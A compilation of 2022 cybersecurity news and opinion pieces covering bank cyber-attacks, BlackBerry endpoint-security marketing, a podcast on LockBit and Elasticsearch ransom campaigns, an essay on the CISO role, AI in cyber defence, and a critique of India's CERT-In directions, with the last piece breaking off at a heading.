Cyber-attacks against financial institutions rose by 238 per cent between February and April of 2020, and globally, one out of four banks had experienced at least one security breach.

In addition, attacks against the banking and financial services industry accounted for 11 per cent of all reported incidents, compared to 7 per cent in other industries.

In 2021, the average number of cyberattacks and data breaches increased by 15.1 per cent from that the previous year.

""This is a matter of grave concern for us. Keeping sensitive business information secure is more important than ever,"" said Hussain, also the managing director of Brac Bank.

Banks must protect their IT infrastructure -- ATM, internet banking, app, debit and credit card systems, phone banking and a host of digital banking platforms – from cyber threats, he said.

More than 200 participants from the banking industry, including managing directors of banks, are participating in the summit.",Cybersecurity Failure,2022-06-12 18:40:57

Are threat actors more likely to spend time trying to break cloud security or exploit known tactics against vulnerable devices connected to the cloud?
Even the way some vendors implement cloud security can expose endpoints to risk.
For this reason, cloud security alone is not a sufficient solution for defending against cyberattacks.
However, partnering with a vendor who only excels at cloud security leaves half of the problem unsolved.","Amid the rush to secure the cloud, some other attack vectors (like endpoints) are being neglected. BlackBerry explains the proper MSSP path forward.

Cybersecurity changes quickly, and in the race to keep pace with attackers, important elements of security may get left behind. For example, cloud and mobile computing transformed the way organizations do business, which forced cybersecurity to make big changes as well. Once smartphones began performing workplace operations and computers adopted software-as-a-service (SaaS) applications, security could no longer be achieved behind an enterprise firewall. As organizational data and devices traveled beyond the office, the old castle-and-moat approach to cybersecurity became obsolete.

Cloud-based services have grown increasingly popular, resulting in many cybersecurity vendors shifting their focus to cloud security. However, in the rush to secure the cloud some other attack vectors, like endpoints, are being neglected. This can be a costly oversight, given the extensive libraries of published vulnerabilities available on the Internet. The MITRE corporation has curated decades of common vulnerabilities and exposures (CVEs) for operating systems, applications, and software libraries. Are threat actors more likely to spend time trying to break cloud security or exploit known tactics against vulnerable devices connected to the cloud?

Cloud security does not need to be compromised when attackers can simply exploit devices that are already trusted. Even the way some vendors implement cloud security can expose endpoints to risk. Consider these two popular methods of cloud-based endpoint security:

Cloud services pushing updated threat information and security patches down to connected clients Clients sending threat telemetry into the cloud where it is analyzed by vendor services

These methods both have advantages and disadvantages, but the obvious questions to ask is what about endpoints that lose connection to the cloud?

Devices may lose connectivity with the cloud for a variety of reasons. Some technology may only be used occasionally, and powered down most of the time. Some devices may experience problems with automatic software updates that result in security patches failing. Other devices may refuse to apply certain updates because they conflict with existing software that is critical for productivity. Whatever the case, endpoints that rely on the cloud for security may become vulnerable when they are not continuously connected to it. For this reason, cloud security alone is not a sufficient solution for defending against cyberattacks. Businesses need a platform that protects cloud-based transactions and endpoints equally.

Neglecting Individual Security Leads to Collective Failure

Many security procedures rely on systems that have a single point of failure. Consider passwords. If an organization uses passwords, but no other form of identity authentication, they are exactly one step away from being compromised. Of course, many modern businesses use some form of multifactor authentication (MFA), so this may seem like a moot point. However, consider one of the most popular ways remote employees connect to the workplace–virtual private networks (VPN). When a user authenticates via VPN, their credentials are approved for the network. Much like a single password can grant a user access to a machine, a single successful VPN login authenticates a user to the entire network. This is a single-point-of-failure approach to network access.

BlackBerry avoids problems like this by taking a holistic, multi-layered approach that secures organizations at the cloud, network, and endpoint level. For example:

BlackBerry protects endpoints with CylancePROTECT , an on-device AI-driven security agent that detects and prevents malware threats with over 99% accuracy. Devices remain continuously secure and capable of performing local threat detection and remediation regardless of their connectivity to the cloud.

, an on-device AI-driven security agent that detects and prevents malware threats with over 99% accuracy. Devices remain continuously secure and capable of performing local threat detection and remediation regardless of their connectivity to the cloud. CylanceGATEWAY

CylanceGUARD

Securing the cloud is important – but so is device, user account, and application security. If a device is compromised, and legitimate user credentials are used to VPN into an environment, the network is compromised. BlackBerry fixes this problem by using Cylance AI to protect individual devices, limiting remote access to approved applications, and continuously monitoring the environment for threats.

MSSPs Can Increase Security Coverage for Customers

Protecting cloud-based assets is a primary concern for the cybersecurity industry, which is why so many vendors narrowly focus on their cloud capabilities. However, partnering with a vendor who only excels at cloud security leaves half of the problem unsolved. MSSPs can help their customers by ensuring that devices, networks, and cloud services are all enjoying an equal level of protection.

Of course, it is important for MSSPs to partner with a security vendor who offers the needed services without demanding they also accept unnecessary ones. Some vendors will not provide specific pieces of a security platform separate from their entire suite of cybersecurity tools. This leaves MSSPs in a position where they risk duplicating their offerings, or losing a significant control over their cybersecurity services. Fortunately, other vendors are more MSSP friendly and willing to accommodate the needs of service providers.

In a few minutes I’ll be joined by Terry Cutler, head of Montreal’s Cyology Labs, to discuss some of what’s been happening recently. But first a look back at headlines from the past seven days:

The LockBit ransomware gang claimed it had stolen data for sale from cybersecurity provider Mandiant, a claim that was quickly denied. What’s going on? Terry has some thoughts. We’ll also look at reports from security researchers on a new pressure strategy on organizations by cybercrooks, and the discovery of over 1,000 Elasticsearch databases online whose content has been replaced with ransom notes.

Elsewhere, the annual RSA security conference was held this week in San Francisco. At a roundtable with reporters the NSA’s director of cybersecurity said the U.S. electronic spy agency is worried ransomware and botnet attacks could be used in November’s midterm elections to erode confidence in U.S. elections. Separately an FBI official told the conference that Chinese hackers have stepped up their probes against the U.S. tech sector since Russia’s invasion of Ukraine.

The United States this week seized the websites of the SSNDOB Marketplace, which sold stolen Social Security numbers and dates of birth of U.S. residents. Over the years the sites listed information on about 24 million people in the U.S. Authorities said the site generated more than US$19 million in sales. The takedown was accomplished with help from law enforcement authorities in Cyprus and Latvia.

A New England medical imaging provider is notifying 2 million Americans that their personal data may be at risk after a data breach.

Security analysts at the SANS Institute warn an unpatched vulnerability in Microsoft’s Support Diagnostic Tool is something Windows administrators need to act on. The flaw, called Follina, can be exploited through a malicious Word document.

And U.S. agencies warned that Chinese-sponsored hacking groups are still exploiting unpatched and publicly-known vulnerabilities in devices from Cisco Systems, Citrix, D-Link, Fortinet, Netgear, Pulse and other network equipment providers to get into IT systems. Patches have been issued for these holes. There’s no excuse for network administrators not to have installed them by now.

(The following transcript has been edited for clarity. To hear the full conversation play the podcast)

Howard: Let’s start by looking at the LockBit ransomware gang’s claim on Monday that it has stolen data from security provider Mandiant for sale. Mandiant denies there’s been a data theft. It could be a coincidence, but LockBit’s claim came out as the annual RSA Conference in San Francisco started. Assuming the data theft is true the goal might have been to embarrass a big company at a big event. Another possibility is LockBit was taking advantage of a Mandiant report the week before that suggested that threat groups are moving to use the Lockbit strain. Terry, what do you think is going on?

Terry Cutler: I think the timing is very interesting because of the RSA Conference. Pretty much all eyes are on RSA, obviously. I think they’re being made to get embarrassed. But at the same time, it’s a PR nightmare because now the supposed hack is overshadowing their brand.

Howard: A researcher at Emsisoft suggested that if it is true that LockBit has some Mandiant files they might have gotten them through hacking another company, not necessarily Mandiant itself.

Terry: We see this repeatedly. It could be a partner that Mandiant works with that has too much access into the Mandiant system. Over time we see a lot of companies that have no [network] monitoring in place, they have bad patching, they have no [intrusion] detection technology, or a partner is no longer working there but their account is still active. There’s also good chance that Mandiant asked for proof of life of the [allegedly stolen] files.

Howard: LockBit is becoming one of the most prominent ransomware groups at least by the number of claimed victims on its data leak site. According to a report from researchers at Kala during the first quarter of this year LockBit claimed it had 226 victims, and that’s second to the Conti group. This report also noted the difficulty, though, of trusting data leak site claims. For example, in January Conti claimed that it hit a U.S. auto dealership and In March the same company was listed on another ransomware gang site and it was listed on a third gang’s site in April. This raises an interesting question: Are gangs co-operating or are they fighting with each other?

Terry: It wouldn’t surprise me if the members are actually overlapping. That way they can actually double-dip. Ransomware gangs actually have a shortage of staff, as well. Last year some of the members of Conti leaked some documents that actually showed some of these groups have an HR department. There’s performance reviews and they even have an employee-of-the-month program. Someone even leaked the Conti ransomware source code.

Howard: The other thing that came out of this report from Kela is that ransomware and data theft gangs have a new strategy: They publish a description of a victim organization but not its name, so if the organization doesn’t pay a ransom for decryption keys or return of data then it would be named. The goal, apparently, is to give the victim company an opportunity to quickly pay up before facing public embarrassment. Here’s an example: The Everest gang listed an unnamed Canadian company in British Columbia as a victim, claiming that it has 96 gigabytes of their data with personal records. Is this a good strategy by a criminal gang?

Terry: How noble of them. This does give victims a bit of breathing room to figure out what was taken, instead of them dealing with chaos trying to find their incident response plan and trying to pay the group …

Howard: There’s no shortage of threat intelligence companies looking into ransomware gangs and their attack patterns. I mention that because also this week security researchers at a company called Black Kite released a report on 21 new victims that the Clop Ransomware gang recently listed on their site. When the researchers scanned the websites of those organizations that were claimed to be victims it found evidence that they weren’t very prepared for cyber attacks. Eighty per cent of the organizations had critical ports left open, 40 per cent had open remote administration ports, 25 per cent had critical vulnerabilities, 45 per cent had leaked credentials These problems may not have been the way the Clop gang got into some or all of these companies. But doesn’t that quick scan suggest that departments still aren’t locking down their infrastructure?

Terry: Yeah, because IT guys aren’t really trained to be cyber security experts. They don’t have the proper tools in place or they lack training or expertise … so it’s important that they at least have a proper strategy in place to at least learn how to scan their environment themselves to detect vulnerabilities that exist.

Howard: So tell me what does a company do when a threat group claims that it has some of their data, but there’s no immediate evidence of a hack?

Terry: I think it becomes a big PR nightmare. It could hurt your brand because what’s happening is you’re being accused of getting hacked without any evidence. So during this time the company has to deal with really bad press. Reporters are constantly trying to get information out of them. And as I mentioned earlier, when a ransomware group comes to you and says ‘We have your stuff you’ve been hacked.’ It’s just a chaotic mess.

Howard: But it isn’t necessarily an immediate PR problem. It only becomes a problem if you refuse to pay and then they release your organization’s name. That increases the squeeze on you. Isn’t that the way it works?

Terry: Yes, but there are also reporters that are linked to the Dark Web, where the moment that that data gets leaked there reporters will have a view — sometimes before the company does.

Howard: Which which all comes back to you’ve got to have a data breach response strategy. You’ve got to be thinking in advance of what may happen and what’s your playbook.

Terry: Again, it comes down to it’s not a matter of if but when[your firm is hacked], so you need to have a proper playbook in place and to make sure your backups are secure. That’s the 3-2-1 backup strategy that we spoke about in previous podcasts [Have 3 copies of your data: — the production data and two backup copies on two different media (disk and tape) with one copy stored off-site].

Howard: I want to move to another report about problems with unsecured instances of Elasticsearch databases. This relates to what we’ve been talking about before, which is data being held for ransom. Researchers at Secureworks said they found a number of Elasticsearch databases where the data has been replaced [by a hacker] with a ransom note that demands payment in bitcoin to get the data back. I’ve reported before on problems with people using Elasticsearch. For those of you who don’t know, Elasticsearch is a search engine that approved employees — and maybe some who aren’t approved — can use it to search across an organization’s entire store of structured and unstructured data. They may want to get insight about customer sales. However, if the resulting search file is left open to the internet — that is, it’s not secured by a password or by encryption — then any crook can find and copy the search results. The original data may be secure. It’s the Elasticsearch copy that’s not. And in this case, the researchers found 1,200 Elasticsearch databases around the world that included a ransom note. What do you make of this?

Terry: It’s important that the IT department gets up to speed with some of the documentation on how to secure these platforms. It’s similar to what’s happened with MongoDB databases … One way to find out if you’re being extorted is to look inside the cybercriminals’ bitcoin wallet [where they demand the ransom be sent]. If you see it at zero then you know that these campaigns usually are just a hoax.

Howard: According to this report the two digital wallets that the thieves have listed for where the bitcoin payments should go are empty. And that suggests that even though 1,200 Elasticsearch databases have had a ransom note inserted in this campaign so far has been a failure.

Terry: But it could also be that they may have backup plans to avoid U.S. [bitcoin transfer] sanctions.

Howard: This comes back to the question of how IT leaders can set enforceable data handling policies for employees. We’ll assume for the moment that the organization allows employees to use Elasticsearch to do searches. How does the company enforce security on the resulting searches?

Terry: I think that the cyber security landscape today is changing so fast the ability for companies of all sizes to be secure is becoming increasingly difficult. They don’t have enough resources, they’re obviously not looking at the proper documentation to secure the environment. They’re overworked and undertrained. Right now cyber security is a real mess. The best solution is outsourcing security to firms that have specialized staff.

Howard: The final story that we want to look at today is one that you had pointed out, the awarding of $1 million in grants this week by the Gula Tech Foundation to groups to help diversify boards of directors. The idea is more women and more people of colour with cyber security expertise should be on boards.

Terry: I think it’s a great thing. The challenge is that cyber security is not a very sexy field. It’s kind of like being a bricklayer: You’re going to have more men in bricklaying than women. Most of the women we see end up in the marketing department or in VP roles and not necessarily doing the technical pieces. So these grants are going to be very important for those that are serious about this. They’ll become advisors that help point businesses in the right way.

Howard: What’s your sense of boards’ ability to understand cyber security issues?

Terry: In one word, they’re overwhelmed. They know how to run a business. They know how advise on business. But they have very, very little real knowledge around cybersecurity. There are always gaps in their knowledge of compliance, and there’s a lack of resources. Not to mention that technology’s changing all the time.

Last, I hear you have a free mobile app to help fight fraud.

Terry: It’s been seven years in the making and about nine months in development. I wanted to build a mobile app that would allow me to educate consumers around fraud and scams that they should be watching out for. The new app is called Fraudster, and it’s available for both Apple and Android so you can check it out at http://www.fraudsterapp.com or type in Fraudster at your app store. The purpose of this app originally was to help consumers to stay safe online. There’s also a business component where they can learn how to secure their firms. they get alerted via push notifications on what to look out for.",Cybersecurity Failure,2022-06-10 19:20:22

Why do the CFO(Chief financial officer), COO(Chief operating officer, CIO(Chief information officer), and CRO(Chief risk officer) need to report to CISO(Chief information security officer), not the other way around?

“CEO: People: Are we ready for the launch?”

“CRO: Absolutely, we should see a bump of 35% in sales in the first quarter.”

“CFO: If we hold the 55% margin, our projections will be inline.”

“CIO: All systems are up and ready. We were over budget. However, it was unavoidable.”

“CEO: Anything else.”

“CISO: We will most likely experience several cyber attacks within minutes after the product launch.”

“CEO: What??? Are you kidding me? I approved your budget personally. Now you are telling us we will be hacked?”

Every element of the dialog above speaks to the criticality of cybersecurity. The company’s decision to enter a new marketplace or develop a new product should revolve around the notion of if a new business venture will survive ongoing cyber-attacks. This threat vector can and will do more harm than any business competitor in the market.

While this may seem far-fetched, many of us could contest the authenticity of the dialog. In my last blog, I discussed why being “hacked should not be a reason for employee termination. Any organization’s cybersecurity posture is everyone’s responsibility, not just the SecOps, DevsecOps, and NetsecOps teams. When should the CISO be the ultimate decision authority regarding digital transformation, security investments, and business risk?

Organizational Structure Still Out Of Date

Old school thinking is still alive and reasonably today still considers cybersecurity insurance, and not everyone gets hacked. Now organizations are investing in actual cybersecurity insurance because of their past belief that security technology would protect them without any regard or understanding of cybersecurity risk. When the investment into more cybersecurity technology became a business decision, this is when organizations’ security posture began to fail. Even with the complex risk analysis tools, ongoing risk assessment, and threat modeling, organizations still have little grasp of their risk tolerance.

Having been a technology sales and engineer professional for 26 years, I have sat in several client meetings with finance people deciding the fate of a deal solely based on “ROI” or some form of financial justification. Gartner, IDC, and Forrester do an incredible job of collecting analytical data to help prove a solid “ROI” for cybersecurity. Even with compelling data, CFO’’s and finance people often have to consider the organization’s needs and balance the growing demand for security over the available funds.

During the early days of Covid-19, many hospitals had to cut back on cybersecurity because several income streams, including elective surgeries, dropped dramatically. Even though many medical attack surfaces continued to be exposed, organizations did make the hard choice to cut back and eliminate SecOps, DevOps, and NetOps resources to reduce operational costs.

Most authors for years have written publically about the need for the CISO to report to the CEO. I believe this change in cultural reporting continues to miss the point of solving the more significant problem in organizations today. Without a difference in the central decision-making process towards security first transformation focusing on cybersecurity concerns, many business initiatives will never reach their full potential.

Every change in organizations today revolves around two components; making money and business transformation. Organizations that do not innovate and adapt will not be around much longer. Digital transformation is this business climate’s mandate for growth, cost reductions, and greater operational efficiencies. To accomplish all of these mandates, technology is at the forefront. Technology innovation, artificial intelligence, machine learning, and DevOps culture have become critical digital transformation pillars. Yet, without security in the DNA, these projects face an uncertain future while failing to show the expected results. Because of operations and cybersecurity events, more digital transformation projects rarely meet or exceed their full potential.

Complex Reporting Relationship Between C-Level Executives

The Case For The CISO Being The Vortex Leader

Suppose every element of a business, including financial forecasting, product development, operations, business development, and company evaluation, revolve around a secure environment. Why would the CISO not be the executive leader? A broad understanding of cybersecurity is needed for organizations to see the big-picture impact.

If, for a moment, the CFO, CRO, CIO, COO, and CMO all report to the CISO. Every financial decision, business operation, product development, go-to-market plan, and risk management posture decision rolled up to the CISO, would that make the organization more resilient?

Would projects reach their full potential? Would wasteful spending on legacy thinking be replaced with secure first initiatives? These could make a case for the CISO, not the CFO.

While many will disagree with this thinking, after witnessing several crushing cyber-attacks in my 26 years career, I will advocate for this new line of thinking.

After witnessing several organizations hacked, I believe that getting breached began a godsend for these companies. Seeing the early finger-pointing from financial teams to the operations people complaining that their processes are outdated and IT not having a say in the project sign-off, all of these fail to understand the true nature of the problem.

Security at the inception of any digital or business transformation ensured the initial survivability of a project along with creating updated operational processes that securely fit the business objective, not making a detection and response plan. These plans have run their course and continue to fail organizations while reducing outcomes expected by the organization.

Security First. Security Second and Security Last should be a new formula for success for every organization.

All the best,

Loading... 5 Real-World AI Cybersecurity Applications That May Benefit Your Business

Cybersecurity companies need to continually develop security technology as new vulnerabilities and threats arise. They have been effectively using artificial intelligence to do so for a long time. Can AI be a game-changer in protecting our data and privacy?

Editor’s Note: This is a guest blog contribution from Mike Jackowski, co-founder and Chief Operating Officer (COO) of ASPER BROTHERS. Mike shares his perspective on ways that AI cybersecurity applications can help strengthen your organization’s cyber defenses.

Cyber attacks and their associated costs are growing exponentially. With the advancement of technology in businesses such as the Internet of Things (IoT), more and more devices are connected to the internet. As such, it’s becoming increasingly difficult to tackle these attacks manually. This is where artificial intelligence in cybersecurity (i.e., AI cybersecurity) comes in.

In general, cybersecurity is all about protecting your organization against cyber attacks that can result in:

Theft and damage of important data and intellectual property,

Stolen funds and fraudulent wire transfers,

Stolen private and business data,

Reputational harm, and

Non-compliance issues.

Such attacks, if successful, can cause serious losses to your business and damage customer relationships. With this in mind, it’s imperative that you take steps to help make your organization and its data as secure as possible against attackers.

AI cybersecurity efficiently reduces breach risks with real-time monitoring and has the capacity to handle situations that are no longer of human scale. Integrating advanced cybersecurity techniques by employing artificial intelligence can help you protect your business from cyberattacks and their devastating consequences.

Let’s hash it out.

What Artificial Intelligence In Cybersecurity Entails

In any domain, artificial intelligence is primarily used to study and learn from data in order to improve decision making. AI can be utilized to scale the operations of cyber threat detection and sort through all the “noise.” This enables you to evaluate which approaches to take based on those specific threats so you can make better data-driven decisions concerning cyber security.

Development of AI

Artificial intelligence is progressively taking over all areas of technology because of its rapid advancements and high applicability. The potential technological applications are also increasing because human intelligence is being simulated and expanded with the use of AI.

AI started with an initial set of algorithms that could simulate human intelligence. Now, it’s expanded to become a technology that has become a part of all the aspects of today’s society, including:

Healthcare,

Manufacturing,

Environmental protection,

Communication technologies.

An influential factor in its development is the huge amount of data available today. The amount of data produced daily is growing exponentially, thus increasing AI’s power and capabilities. Dr. Kai-Fu Lee, an AI Expert and former vice president for tech giants like Apple, Microsoft, and Google, told 60 Minutes:

“I believe (Artificial Intelligence) is going to change the world more than anything in the history of mankind. More than electricity.”

The current advancements show a promising future for AI (and AI cybersecurity). As such, it would not be wrong to assume that, at least in some aspects, AI can attain and even exceed the capabilities of a human mind.

Prevalence and Use of AI in Cyber Security

AI is becoming more and more prevalent in cybersecurity. According to IBM, in terms of mitigating and combating cyber attacks, security professionals struggle for several reasons:

They face an overwhelming number of tasks. The sheer number of analysis and assessment tasks they’re responsible for handling are beyond human scale. There’s never enough time (time deficit). The time required to respond to cyber attacks has to be minimized as much as possible. There’s too much data to handle (data overload). Although having lots of data at your disposal is great, all of that data has to be sorted through and analyzed. This takes a lot of time and resources without AI cybersecurity tools at your disposal. The industry is facing an ongoing skills shortage. As we’ve seen for a while now within the industry, the necessary skills are not always readily available.

Therefore, all IBM Security products use AI. IBM further details that AI can automate the response to security breaches — it enables faster detection, analysis, and response, thereby accelerating the process with the benefit of enhanced accuracy.

“Where do I think AI will be in 5 to 10 years? While the possibilities are endless, I believe the most consequential will be secure application development.” — Sridhar Muppidi (Chief Technology Officer for IBM Security)

Similarly, Microsoft also talks about the advancement of cybersecurity with the help of artificial intelligence. Some of the major advantages of using AI in cybersecurity they highlight include:

Enhanced cyber attack detection and threat analysis,

Improved ability to resist and respond to the scale and speed of attackers,

Greater ability to interpret and learn from attacks to improve response

How Implementing AI in Cybersecurity Benefits Your Organization and Customers

There are numerous benefits for you and your customers if AI cybersecurity is utilized as part of your organization’s defenses. Organizations can prevent downtime if they have robust cybersecurity systems that employ AI. Data from a 2019 PwC Digital Trust Insights survey showed that nearly half of their respondents (47% of a total of 3,500 organizations across the globe) reported that cyber incidents caused downtime between 2017 to 2019.

With the increase in cyber attacks occurring each year, these numbers are expected to increase further. With the help of AI, organizations can automate cyber attack detection and response. According to Webroot, AI technologies (like automated detection and response [ADR] tools) can be used to automate everyday security tasks without relying solely on human teams. AI-based cybersecurity systems learn and adapt to ever-evolving cyber attacks and malware.

Automation is particularly useful for shifting the responsibility of handling monotonous tasks from your IT and cybersecurity employees. This allows them to shift their focus to projects and tasks that require their expertise, skills, and critical thinking capabilities.

AT&T emphasizes the benefits of blending AI and cyber security as a reasonable strategy for adaptive cyber security. All of this shows that the organization can benefit greatly by preventing disastrous attacks if they integrate AI into their cyber security defenses, which will result in more accurate, timely, and robust detection of cyber attacks.

According to MIT News, detecting the data generated in a cyber attack among all the normal data generated by the organization’s customers and employees is nothing less than finding a needle in a haystack. Therefore, it seems necessary to human-machine collaboration, which will ultimately optimally cover key areas of cybersecurity.

5 Applications of AI in Cybersecurity

Now that we have a good idea of what AI cybersecurity entails, let’s explore a half-dozen practical applications of it:

1. Enhancing Your Network Security

Network security deals with the protection against destruction, unauthorized access, and misuse of files and data in a system. It also protects the confidentiality of a network within an organization. AI can be utilized to automatically analyze the network traffic for any potential breaches or unauthorized access. Nick Atkin, who is the Head of Solution Architecture at Dubber, is quoted as saying, “AI can signal not just breaches in data protection but also breaches related to the content within that data.”

In network security, your network architecture and security policies are essential. The network architecture is responsible for taking care of the ways a business connects to the internet. The architecture is also important for keeping the business reliably and safely connected to the internet. For managing security on a network, a network policy is typically used to formalize the guidelines and procedures utilized to keep a network secure. According to Toolbox, AI can employ security policies and map the network traffic patterns to these policies.

Some common AI-powered cybersecurity platforms include:

IBM QRadar

Cynet

Darktrace

FireEye

2. Detecting Advanced Malware

Malware has been a serious threat to the security of organizations, and they evolve very rapidly. According to TechTarget SearchSecurity, one of the most triumphant accomplishments of AI in cybersecurity is the accurate detection of malware due to the availability of large amounts of data for training the deep learning models.

AI cybersecurity threat detection systems are particularly useful for finding malware applications that can keep changing themselves to avoid getting detected (e.g., polymorphic and metamorphic malware).

Polymorphic malware is a category of malicious programs that continuously change a portion of their codes and use encryption (for hiding its code) to evade anti-malware software. These cyber weapons use mutation engines to modify themselves and continuously evolve so as to make them difficult to detect. Unfortunately, these malicious programs have become quite common. According to a research by Webroot among the malicious software they analyze, 94% of them are polymorphic in nature.

Likewise, metamorphic malware is a category of similar malicious programs that change themselves to avoid getting detected, but they are even harder to detect than their polymorphic counterparts. The prime difference between metamorphic and polymorphic malware is that the former change their source codes entirely; polymorphic keeps some parts of its code, only modifying others.

The reason for rewriting the entire source code is to evade the anti-malware tools more effectively. These malwares are extremely difficult to detect using traditional cybersecurity tools. Thus, the learning and adaptive capabilities of AI cybersecurity are needed to detect and handle these continuously evolving threats.

3. Increasing Your Organization’s Data Privacy

AI cybersecurity systems can help prevent breaches of sensitive organization and customer data. Google has used Tensorflow to block 100 million spam emails. Tensorflow is a deep learning frame library for preventing image-based emails that are hard to detect and can also be used to steal organizational data.

An IBM Report analyzed the cost of data breaches. According to this report, customer data was exposed in 44% of the crimes, making it the most common type of information exposed in these breaches. The same report also shows that data breaches of organizations with automated security systems resulted in significantly lower costs per breach ($2.90 million) compared to those with no automation ($6.71 million).

4. Taking Your Cloud Security to the Next Level

With almost everything moving to the cloud, the risk of cyber attacks on cloud systems have also increased significantly. Gartner predicts that the cloud-first principle will be adopted by eight in 10 (85%) organizations by 2025. It also predicts that cloud-native platforms will host nearly all (more than 95%) digital workloads in that same timeframe.

According to CNBC, tech giants like Microsoft, Amazon, and Google have invested heavily in cybersecurity to combat the growing number of cyber attacks on their cloud platforms:

Google acquired Mandiant,

Microsoft acquired CloudKnox Security and RiskIQ, and

AWS acquired Wickr.

AI is a very important element for preventing cyber attacks on the cloud because of the large volume and evolution of such attacks. Cloud service providers are actively employing advanced AI to create more robust and resilient cyber security systems. “100% of our products use AI,” says Sridhar Muppidi, the CTO of IBM Security mentioned earlier.

5. Giving IoT Security a Boost

The Internet of Things (IoT) is taking the world ahead by connecting everything to the internet. It has the potential to revolutionize almost all industries, and many businesses are investing heavily in IoT. McKinsey estimates that through 2022, IoT technology will experience a 13.6% increase in investments. IoT will connect a huge number of devices to the internet, thus exposing these devices (and the data produced by them) to potential attacks.

It’s not possible to handle the security of enormous amounts of devices on a human scale. AI will eventually become the only option for automatically monitoring, detecting, and preventing cyber attack activities. Azom describes IoT as still being in its infancy, with few security mechanisms for these devices. Knowing this, capitalizing on AI cybersecurity may help you make these smart devices more secure.

However, the development of AI- and machine learning-based cybersecurity for IoT is still new and under research. Many researchers are exploring this avenue, such as Kuzlu et al. who explored the role that AI will play in the security of IoT devices.

The Cybersecurity Risks of Artificial Intelligence

AI has very promising applications for improving the security of organizations. Simultaneously, it also comes with problems such as misuse by cybercriminals and nation-state actors. The vast amount of publicly available data that helps make advanced AI cybersecurity systems more resilient and effective at attack prevention can also be used by cybercriminals to train their AI systems to bypass them.

It would not be wrong to say that under unfortunate circumstances, AI can be a double-edged sword in the world of cybersecurity. Some of the cases in which bad guys can use AI to their advantage are as follows:

As we touched on earlier, malware developers can use AI to develop advanced polymorphic and metamorphic malware. These systems are difficult to detect by traditional anti-malware systems and cause serious problems if they infiltrate your network and other critical systems. AI can be used to make malware adaptable to detection by training the system on detection by powerful anti-malware software thus incrementally making the malware better and better. The more time is spent in training the system for adaptability, the harder it would be to detect such malware.

Creating “Deep Fakes” That Make More Convincing Phishing Attacks

Deep fake data can be generated using a vast amount of training data making it possible to bypass the security systems because such systems are dependent on data. Deep fakes also include facial videos and voices which match the original one so closely that it is extremely hard to distinguish.

With sufficient data for training, cybercriminals can use AI to make super realistic deep fakes that can bypass automated systems and humans as well. One such case is when the hackers used deep fake technology to impersonate an energy company CEO’s voice. The attackers used it to contact one of the CEO’s subordinates to instruct them to transfer $243,000 to a fraudulent account they controlled.

Creating Physical Threats and New Ransomware Opportunities

Self-driving cars use AI for their functioning and security. There is a possibility of attacking these self-driving cars with AI. This is discussed by Macquarie University, which states that self-driving cars can be vulnerable to malware attacks. Similarly, AI-based adversarial attacks can be used to fool self-driving cars into misinterpreting signs.

Final Thoughts on AI Cybersecurity

Artificial intelligence, undoubtedly, has unmatched potential for accuracy, speed, and scale in cybersecurity. New technological advancements such as IoT are bringing larger quantities of data to the table, and along with all of that information comes an increasing number of analyses that have to be made.

The requirement to analyze big data in real-time with acceptable accuracy is already getting out of hand for human intelligence. We need a way to intelligently, quickly, and effectively sort through all the data “noise” to put it to use to enhance our defenses and mitigate security issues. At present and in the future, AI will be needed in cybersecurity to make robust and resilient systems that are adaptive, scalable, and automated.",Cybersecurity Failure,2022-06-07 13:43:48

While increasing surveillance, the directions issued by CERT-In present few, if any, benefits for security of the state or individuals

If you had to choose between privacy and security, which would you prefer? While the answer may lean towards security for many, imagine losing out on both. This is likely to be the fallout of directions issued by the Indian Computer Emergency Response Team (CERT-In) on April 28, 2022.

Let’s first cover the basics. CERT-In is a body established under the Information Technology Act, 2000 tasked with the broad mandate of “securing Indian cyberspace”, and reports to the Ministry of Electronics and IT (MEITY). With ubiquitous digitisation, cyber security has gained prominence in recent years. For instance, as per a parliamentary response CERT-In reported an almost nine-fold increase over six years to a total of 48,285 cyber security incidents related to government authorities. It mirrors the experience of users and the private sector who feel unsafe with their personal data being routinely breached, often leading to cyber crime. As per the Crime In India report in 2020, there has been an almost 12% rise in cyber crimes, with the large majority clustered in the categories of fraud, sexual exploitation and extortion. These are serious consequences for national and user security that increase the importance of CERT-In’s mission.

Woefully, the directions issued by CERT-In, while increasing surveillance, present few, if any, benefits for security of the state or individuals. These directions go into effect on June 27, 2022, and have six operative provisions whose violation carries a one-year term of imprisonment. While much of the concern has arisen from users of Virtual Private Networks (VPNs), the directions go much further.

Synchronisation, immediate reporting

Let us deal with each direction individually, starting with the requirement for all service providers to connect their system clocks to the network time protocol servers of the government. On the face of it, this is a welcome move, as all computer systems contain logs which require verifiable timestamps. However, by linking them to government servers, security experts have observed that it creates a single point of failure and increases the attack surface for a supply chain attack.

The second direction requires all service providers to inform CERT-In whenever any “cyber incidents” occur, within six hours of gaining knowledge. This is again another direction which is positive at first glance, as it indicates that the government will now need to be informed any time there is a data breach rather than the information being tucked away in a corporation’s black box. However, there are core deficiencies which undermine the positives. One, “cyber incident” is not properly defined and makes reference to vague categories such as “fake mobile apps”. Even routine events such as “unauthorized access to social media accounts” will need to be reported. This will not only increase the reporting burden of system administrators, but flood CERT-In with notifications beyond their response capacity. Furthermore, there is no obligation on CERT-In to inform users who are ultimately at risk. There is no mention of what actions CERT-In must take and how its actions will be publicly disclosed. Reporting “cyber incidents” is also an incomplete measure, given there is no provision for penalties and fines on the public or private sector.

Real-time information

The third direction enhances the power of CERT-In to seek information from service providers by extending them to “protective and preventive actions”. Again, there is little transparency on how CERT-In will exercise this power which now includes seeking “real time” information that could be used for the purpose of surveillance. Quite simply, CERT-In can direct any system provider even without a security incident occurring, with little oversight, and seek any data. Such surveillance fears become obvious when we look at the next two directions.

Imagine that each online service provider will now maintain and store logs of all your online activity for 180 days and store them within India. This is not all — some, including data centres and VPNs, will be required to mandatorily register users. These two directions have gathered the bulk of public criticism from many users of VPNs. VPNs provide a tunnel for online activity in which a user first plugs into a VPN server that in turn fetches information from the Internet. Hence, all it shows to an Internet service provider such as Airtel or Jio, or even the websites a user visits, is the connection and address of the VPN server. This permits accessing blocked content, geolocating to another country or also, as claimed, surfing the Internet without logging. While the privacy claims of VPN providers are contentious, according to the Freedom of the Press Foundation if chosen well they “offer key security benefits to your workflow”. All of this will be a thing of the past with the mandate to store logs, that will essentially mean that whether you are a VPN user or not, each service provider will be required to collect and store more personal data of users. This may result in zero knowledge services such as messaging applications like Signal or secure browsing technologies like Tor being blocked in India. In addition to this, providers will now need to mandatorily register users on seven data points like a bank’s KYC process and store it for five years. This is a tremendous expansion in data collection which will match a person’s online activity with their real world identity.

The government response

